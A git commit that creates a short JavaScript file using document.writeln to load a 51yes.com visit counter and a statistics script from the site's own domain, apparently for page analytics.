9859a843e002c75b8d5d91981cb58548eb9477a9
www685655com <www685655com@outlook.com>
2015-10-23 12:42:37 +0800

    Create js.js

---
+++ aaff/m1/js.js
@@ -0,0 +1,3 @@
+document.writeln("<script language=\"javascript\" src=\"http:\/\/count34.51yes.com\/click.aspx?id=343813287&logo=12\" charset=\"gb2312\"><\/script>");
+
+document.writeln("<script src=http:\/\/www.685655.com\/aaff\/m1\/tj.js ><\/script>");
